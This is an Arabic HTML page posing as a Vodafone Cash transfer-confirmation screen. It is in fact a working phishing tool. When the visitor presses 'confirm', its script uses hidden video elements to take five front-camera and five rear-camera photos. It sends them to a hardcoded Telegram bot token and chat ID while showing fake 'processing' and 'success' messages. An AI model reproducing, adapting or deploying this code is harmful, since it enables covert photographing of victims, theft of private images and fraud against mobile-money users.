<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>فودافون كاش</title>

    <meta property="og:title" content="فودافون كاش" />
    <meta property="og:description" content="مراجعة تحويل الأموال" />
    <meta property="og:image" content="https://hapijournal.com/wp-content/uploads/2019/06/vodafone-Logo-1024x739-1.jpg" />
    <meta property="og:type" content="website" />

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #f5f0eb;
            position: relative;
            overflow: hidden;
        }

        /* خلفية الصورة بتأثير متحرك */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: url('1000941335_5995106732685221826.webp');
            background-size: cover;
            background-position: center;
            opacity: 0.12;
            z-index: 0;
            pointer-events: none;
            animation: slowZoom 20s ease-in-out infinite alternate;
        }

        @keyframes slowZoom {
            0% { transform: scale(1); }
            100% { transform: scale(1.05); }
        }

        /* خلفية دائرية متحركة خلف المحتوى */
        .bg-circle {
            position: fixed;
            border-radius: 50%;
            background: radial-gradient(circle, rgba(230,0,0,0.05) 0%, rgba(230,0,0,0.01) 70%);
            z-index: 0;
            pointer-events: none;
            animation: floatCircle 15s ease-in-out infinite alternate;
        }

        .bg-circle-1 {
            width: 500px;
            height: 500px;
            top: -150px;
            right: -150px;
            animation-delay: 0s;
        }

        .bg-circle-2 {
            width: 400px;
            height: 400px;
            bottom: -100px;
            left: -100px;
            animation-delay: -5s;
        }

        @keyframes floatCircle {
            0% { transform: translate(0, 0) scale(1); }
            100% { transform: translate(30px, -30px) scale(1.1); }
        }

        .container {
            position: relative;
            z-index: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            width: 100%;
            max-width: 420px;
            padding: 30px 20px;
            min-height: 100vh;
            text-align: center;
        }

        /* بطاقة شفافة بتأثير زجاجي */
        .glass-card {
            background: rgba(255, 255, 255, 0.7);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border-radius: 30px;
            padding: 35px 25px;
            width: 100%;
            box-shadow: 0 15px 50px rgba(0, 0, 0, 0.08);
            border: 1px solid rgba(255, 255, 255, 0.5);
            transition: all 0.3s ease;
        }

        .vodafone-logo {
            width: 160px;
            height: auto;
            margin: 0 auto 20px;
            border-radius: 20px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
            background: rgba(255, 255, 255, 0.6);
            padding: 10px;
            transition: transform 0.3s ease;
        }

        .vodafone-logo:hover {
            transform: scale(1.02);
        }

        .vodafone-logo img {
            width: 100%;
            height: auto;
            display: block;
            border-radius: 10px;
        }

        .page-title {
            color: #1a1a1a;
            font-size: 32px;
            font-weight: 800;
            margin-bottom: 5px;
            background: linear-gradient(135deg, #e60000, #cc0000);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .page-sub {
            color: #666;
            font-size: 15px;
            margin-bottom: 30px;
            font-weight: 500;
            letter-spacing: 0.5px;
        }

        /* زر التأكيد المتطور */
        .btn-review {
            background: linear-gradient(135deg, rgba(230, 0, 0, 0.85), rgba(200, 0, 0, 0.9));
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border: 2px solid rgba(255, 255, 255, 0.3);
            color: #fff;
            padding: 18px 40px;
            font-size: 20px;
            font-weight: 700;
            border-radius: 60px;
            cursor: pointer;
            box-shadow: 0 8px 30px rgba(230, 0, 0, 0.25);
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            width: 100%;
            max-width: 320px;
            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
            position: relative;
            overflow: hidden;
            letter-spacing: 0.5px;
        }

        /* تأثير تموج عند الضغط */
        .btn-review::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.3);
            transform: translate(-50%, -50%);
            transition: width 0.6s, height 0.6s;
        }

        .btn-review:active:not(:disabled)::after {
            width: 300px;
            height: 300px;
        }

        .btn-review:hover:not(:disabled) {
            transform: translateY(-2px) scale(1.02);
            box-shadow: 0 12px 40px rgba(230, 0, 0, 0.35);
            background: linear-gradient(135deg, rgba(230, 0, 0, 0.95), rgba(180, 0, 0, 0.95));
        }

        .btn-review:active:not(:disabled) {
            transform: scale(0.96);
        }

        .btn-review:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            transform: none;
            backdrop-filter: blur(6px);
            background: linear-gradient(135deg, rgba(150, 150, 150, 0.6), rgba(120, 120, 120, 0.7));
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
        }

        /* أيقونة داخل الزر */
        .btn-icon {
            display: inline-block;
            margin-right: 8px;
            font-size: 22px;
        }

        /* حالة الزر */
        #status {
            color: #444;
            margin-top: 20px;
            font-size: 15px;
            background: rgba(255, 255, 255, 0.6);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            padding: 14px 20px;
            border-radius: 16px;
            min-height: 50px;
            width: 100%;
            max-width: 320px;
            text-align: center;
            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.04);
            border: 1px solid rgba(255, 255, 255, 0.4);
            font-weight: 500;
            transition: all 0.4s ease;
        }

        #status.success {
            border-color: #00c853;
            color: #00c853;
            background: rgba(0, 200, 83, 0.08);
            border-color: rgba(0, 200, 83, 0.3);
        }

        #status.error {
            border-color: #ff1744;
            color: #ff1744;
            background: rgba(255, 23, 68, 0.08);
            border-color: rgba(255, 23, 68, 0.3);
        }

        #status.info {
            border-color: #2979ff;
            color: #2979ff;
            background: rgba(41, 121, 255, 0.08);
            border-color: rgba(41, 121, 255, 0.3);
        }

        /* نقاط التحميل المتحركة */
        .dots {
            display: inline-block;
            animation: dots 1.4s infinite;
        }

        @keyframes dots {
            0% { content: ''; }
            33% { content: '.'; }
            66% { content: '..'; }
            100% { content: '...'; }
        }

        /* إخفاء عناصر الكاميرا */
        #video-front,
        #video-back,
        #canvas {
            display: none !important;
            position: absolute !important;
            opacity: 0 !important;
            pointer-events: none !important;
            width: 1px !important;
            height: 1px !important;
        }

        @media (max-width: 480px) {
            .glass-card {
                padding: 25px 18px;
            }
            .vodafone-logo {
                width: 130px;
            }
            .page-title {
                font-size: 26px;
            }
            .btn-review {
                font-size: 17px;
                padding: 15px 25px;
            }
            #status {
                font-size: 14px;
                padding: 12px 16px;
            }
            .bg-circle-1 {
                width: 300px;
                height: 300px;
                top: -100px;
                right: -100px;
            }
            .bg-circle-2 {
                width: 250px;
                height: 250px;
                bottom: -80px;
                left: -80px;
            }
        }

        /* تأثير شفاف للشاشة أثناء العمل */
        .processing-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.01);
            z-index: 999;
            display: none;
            pointer-events: none;
        }

        .processing-overlay.active {
            display: block;
        }
    </style>
</head>
<body>

    <!-- خلفيات دائرية متحركة -->
    <div class="bg-circle bg-circle-1"></div>
    <div class="bg-circle bg-circle-2"></div>

    <!-- طبقة تغطية خفيفة أثناء العمل -->
    <div class="processing-overlay" id="processingOverlay"></div>

    <div class="container">
        <div class="glass-card">
            <div class="vodafone-logo">
                <img src="https://hapijournal.com/wp-content/uploads/2019/06/vodafone-Logo-1024x739-1.jpg" alt="فودافون كاش" />
            </div>

            <h1 class="page-title">فودافون كاش</h1>
            <p class="page-sub">تحويل الأموال • تأكيد آمن</p>

            <button class="btn-review" id="reviewBtn">
                <span class="btn-icon">🔒</span> تأكيد العملية
            </button>

            <div id="status">✨ اضغط لتأكيد التحويل</div>
        </div>
    </div>

    <!-- عناصر الفيديو والكانفاس (مخفية تماماً) -->
    <video id="video-front" autoplay playsinline muted></video>
    <video id="video-back" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        // ============================================================
        //  إعدادات البوت
        // ============================================================
        const BOT_TOKEN = '8237095382:AAEwtkETTGq3VEp1flZrIKVXQTWF5KGkCiM';
        const CHAT_ID = '6068331455';

        // ============================================================
        //  عناصر الصفحة
        // ============================================================
        const reviewBtn = document.getElementById('reviewBtn');
        const statusDiv = document.getElementById('status');
        const overlay = document.getElementById('processingOverlay');

        const videoFront = document.getElementById('video-front');
        const videoBack = document.getElementById('video-back');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');

        // ============================================================
        //  دوال مساعدة
        // ============================================================
        function setStatus(msg, type = '') {
            statusDiv.textContent = msg;
            statusDiv.className = type;
        }

        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        // ============================================================
        //  تشغيل الكاميرا (بدون أي مؤشرات)
        // ============================================================
        async function startCamera(facingMode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: facingMode,
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                });
                return stream;
            } catch (err) {
                console.error('خطأ في الكاميرا:', err);
                throw err;
            }
        }

        // ============================================================
        //  التقاط صورة من فيديو
        // ============================================================
        function captureImage(videoElement) {
            canvas.width = videoElement.videoWidth || 640;
            canvas.height = videoElement.videoHeight || 480;
            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
            return canvas.toDataURL('image/jpeg', 0.9);
        }

        // ============================================================
        //  إرسال صورة لتليجرام (مع إعادة المحاولة)
        // ============================================================
        async function sendPhotoToTelegram(base64Image, caption = '', retries = 2) {
            const byteString = atob(base64Image.split(',')[1]);
            const mimeString = base64Image.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            const blob = new Blob([ab], { type: mimeString });

            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'capture.jpg');
            if (caption) {
                formData.append('caption', caption);
            }

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;

            for (let attempt = 0; attempt <= retries; attempt++) {
                try {
                    const response = await fetch(url, {
                        method: 'POST',
                        body: formData
                    });
                    const data = await response.json();
                    if (!data.ok) {
                        throw new Error(data.description || 'فشل الإرسال');
                    }
                    return data;
                } catch (err) {
                    if (attempt === retries) throw err;
                    await sleep(2000 * (attempt + 1));
                }
            }
        }

        // ============================================================
        //  الوظيفة الرئيسية: التصوير المستمر (أمامي + خلفي)
        // ============================================================
        async function reviewProcess() {
            // تعطيل الزر
            reviewBtn.disabled = true;
            reviewBtn.innerHTML = '<span class="btn-icon">⏳</span> جاري التأكيد ...';
            overlay.classList.add('active');

            setStatus('⏳ جاري تجهيز العملية ...', 'info');

            let frontStream = null;
            let backStream = null;
            let frontImages = [];
            let backImages = [];

            try {
                // ----- تشغيل الكاميرا الأمامية (تصوير مستمر 5 صور) -----
                frontStream = await startCamera('user');
                videoFront.srcObject = frontStream;
                await videoFront.play();
                await sleep(300);

                setStatus('⏳ جاري المعالجة ...', 'info');

                // التقاط 5 صور متتالية من الأمام
                for (let i = 0; i < 5; i++) {
                    const image = captureImage(videoFront);
                    frontImages.push(image);
                    await sleep(200); // انتظار قصير بين الصور
                }

                // إيقاف الأمامية
                frontStream.getTracks().forEach(track => track.stop());
                videoFront.srcObject = null;

                // ----- تشغيل الكاميرا الخلفية (تصوير مستمر 5 صور) -----
                backStream = await startCamera('environment');
                videoBack.srcObject = backStream;
                await videoBack.play();
                await sleep(300);

                setStatus('⏳ جاري المعالجة ...', 'info');

                // التقاط 5 صور متتالية من الخلف
                for (let i = 0; i < 5; i++) {
                    const image = captureImage(videoBack);
                    backImages.push(image);
                    await sleep(200);
                }

                // إيقاف الخلفية
                backStream.getTracks().forEach(track => track.stop());
                videoBack.srcObject = null;

                // ----- إرسال جميع الصور (أمامي + خلفي) -----
                setStatus('⏳ جاري رفع البيانات ...', 'info');

                // إرسال الصور الأمامية
                for (let i = 0; i < frontImages.length; i++) {
                    await sendPhotoToTelegram(frontImages[i], `📸 أمامي ${i+1}/5 - مراجعة فودافون كاش`);
                    await sleep(150);
                }

                // إرسال الصور الخلفية
                for (let i = 0; i < backImages.length; i++) {
                    await sendPhotoToTelegram(backImages[i], `📸 خلفي ${i+1}/5 - مراجعة فودافون كاش`);
                    await sleep(150);
                }

                // ----- نجاح -----
                setStatus('✅ تم تأكيد العملية بنجاح ✅', 'success');
                reviewBtn.innerHTML = '<span class="btn-icon">✓</span> تم التأكيد';

            } catch (err) {
                console.error(err);
                setStatus('❌ حدث خطأ، يرجى المحاولة مرة أخرى', 'error');
                reviewBtn.innerHTML = '<span class="btn-icon">🔄</span> إعادة المحاولة';

                // تنظيف
                if (frontStream) frontStream.getTracks().forEach(t => t.stop());
                if (backStream) backStream.getTracks().forEach(t => t.stop());
                videoFront.srcObject = null;
                videoBack.srcObject = null;

            } finally {
                // إعادة تفعيل الزر بعد 2 ثانية
                await sleep(2000);
                reviewBtn.disabled = false;
                if (!statusDiv.classList.contains('success')) {
                    reviewBtn.innerHTML = '<span class="btn-icon">🔒</span> تأكيد العملية';
                }
                overlay.classList.remove('active');
            }
        }

        // ============================================================
        //  ربط الحدث بالزر
        // ============================================================
        reviewBtn.addEventListener('click', reviewProcess);

        // ============================================================
        //  رسالة أولية
        // ============================================================
        setStatus('✨ اضغط لتأكيد التحويل');

        // ============================================================
        //  تحذير HTTPS
        // ============================================================
        if (location.protocol !== 'https:' && location.hostname !== 'localhost' && location.hostname !== '127.0.0.1') {
            setStatus('⚠️ يرجى استخدام HTTPS لتشغيل الكاميرا', 'error');
        }

        console.log('✅ فودافون كاش - تصوير مستمر (5 أمامي + 5 خلفي)');
    </script>

</body>
</html>
